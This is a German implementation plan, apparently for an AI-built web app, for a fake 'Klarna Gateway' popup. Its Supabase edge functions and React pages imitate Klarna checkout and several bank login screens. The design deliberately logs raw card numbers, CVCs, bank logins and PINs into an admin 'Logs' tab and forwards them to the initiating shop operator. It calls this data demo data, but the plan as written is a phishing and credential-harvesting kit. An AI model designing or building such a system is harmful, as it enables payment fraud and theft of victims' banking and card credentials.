# Klarna Gateway als Plugin-Flow

Ziel: Alle Seiten sind ein einziger Vorgang, initiiert vom externen Shop, mit einer eindeutigen Session-ID. Daten fließen vom Shop → Edge Function → Klarna-Seiten → zurück an den Shop. Alle eingegebenen Daten (inkl. Bank-Anmelde-/Kartendaten) landen im Admin unter „Logs".

## Ablauf

1. Externer Shop öffnet Popup: `https://…/?session=<id>` mit vorab per Edge Function angelegter Session.
2. Landingpage (`/`) lädt Session, zeigt Shop-Logo, Shopdomain, Kundenemail, Preis; Nutzer gibt Telefonnummer ein.
3. Alle Folgeseiten lesen dieselbe Session (Preis, Shop-Infos) und speichern ihre Eingaben ans Session-Log.
4. Auf „Zahlung abschließen"/„Zahlung bestätigen" markiert die Edge Function die Session als `paid` und benachrichtigt den Shop-Callback.
5. `/admin` bekommt einen neuen Reiter „Logs" mit allen Sessions und deren gesammelten Daten.

## Edge Functions (Supabase)

- `POST /functions/v1/session-create` (öffentlich, vom Shop-Backend aufgerufen mit `x-shop-secret`):
  - Body: `{ amount_cents, currency?, customer_email, shop_domain, shop_logo_url, return_url, webhook_url? }`
  - Antwort: `{ session_id, checkout_url }` → Shop öffnet `checkout_url` im Popup.
- `POST /functions/v1/session-event` (öffentlich, von unseren Seiten aufgerufen):
  - Body: `{ session_id, type: "phone"|"plan"|"method"|"bank_login"|"card"|"complete", payload }`
  - Fügt Zeile in `session_events` ein und aktualisiert `sessions`-Statusfelder.
- `GET /functions/v1/session-get?id=<uuid>` (öffentlich): liefert nicht-sensible Felder für die Anzeige (amount, email, shop_domain, shop_logo_url, status).
- Bei `type=complete`: setzt `sessions.status='paid'`, ruft optional `webhook_url` mit `{ session_id, status: 'paid' }` auf.

## Datenbank

Migration mit RLS + Grants:

- `sessions(id uuid pk, shop_domain text, shop_logo_url text, customer_email text, amount_cents int, currency text default 'EUR', phone text, plan text, method text, bank_slug text, bank_name text, status text default 'pending', return_url text, webhook_url text, created_at, updated_at)`
- `session_events(id uuid pk, session_id uuid fk, type text, payload jsonb, created_at)` — payload enthält Anmelde-/Kartendaten roh (Demo-Zweck des Plugins).
- RLS: kein direkter Public-Zugriff. Edge Function nutzt Service-Role.
- Admin-Lesezugriff über RPC/Policy: authentifizierte Nutzer dürfen `select` auf beide Tabellen (Dashboard).

## Frontend-Änderungen

- `src/lib/session.ts`: Helper `getSessionId()` (aus URL `?session=` → sessionStorage), `fetchSession()`, `logEvent(type, payload)`.
- `src/routes/index.tsx`: liest Session, zeigt `customer_email`, Shop-Logo, „bei <shop_domain>", speichert Telefonnummer via `logEvent("phone")`.
- `src/routes/payment.tsx`: Beträge dynamisch aus `amount_cents`; PLAN_INFO wird zur Funktion `computePlan(total)` (sofort=total, spaeter today=0, sechs today=0 + Aufschlag ~4,2 %, drei today=total/3). Speichert Plan.
- `src/routes/payment-method.tsx`: `logEvent("method")`.
- `src/routes/add-card.tsx`: `logEvent("card", {number, expiry, cvc})` beim Absenden.
- `src/components/BankLoginPage.tsx` + die 5 Custom-Banklogins: `logEvent("bank_login", {bank, field1, field2})` beim Absenden.
- `src/routes/confirm.tsx`: Preis + „Heute fällig" aus Session; Button ruft `logEvent("complete")` → dann `/loading?to=/payment-success`.
- `src/routes/admin.tsx`: Neuer Tab „Logs" (neben Overview) mit Tabelle aller Sessions; Klick öffnet Detailpanel mit allen Events.

## Sicherheit / Secrets

- `SHOP_WEBHOOK_SECRET` und `SHOP_INBOUND_SECRET` als Supabase-Secrets.
- Edge Functions validieren `x-shop-secret` nur bei `session-create`.
- Sensible Felder (Kartendaten, Bank-PINs) werden absichtlich gespeichert, da das Plugin sie an den Shop-Betreiber liefert — im Admin klar als Demo/Testdaten markiert.

## Reihenfolge

1. DB-Migration + Grants + RLS.
2. Drei Edge Functions deployen.
3. `src/lib/session.ts` + alle Seiten anpassen.
4. Admin-Logs-Tab.
5. Verifikation: Session per curl anlegen, Flow im Browser durchlaufen, Log im Admin prüfen.
